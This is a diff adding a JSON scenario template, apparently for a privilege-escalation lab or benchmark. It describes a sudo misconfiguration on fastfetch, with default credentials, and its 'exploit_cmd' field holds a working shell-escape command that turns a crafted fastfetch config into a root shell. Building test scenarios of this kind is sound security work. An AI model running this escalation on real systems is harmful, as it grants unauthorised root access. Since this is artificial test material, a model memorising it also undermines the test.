@@ -1,0 +1,31 @@
+{
+  "template_id": "auto_T1548_003_sudo_fastfetch",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "sudo misconfiguration allows running /usr/bin/fastfetch as root, enabling shell",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "dedup_group": "sudo_config_shell_escape",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "T1548_003_sudo_fastfetch",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ],
+  "exploit_cmd": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /bin/sh 1>&0 2>&0\"}]}' >/path/to/temp-file.jsonc\nfastfetch -c /path/to/temp-file.jsonc",
+  "binary_path": "/usr/bin/fastfetch"
+}
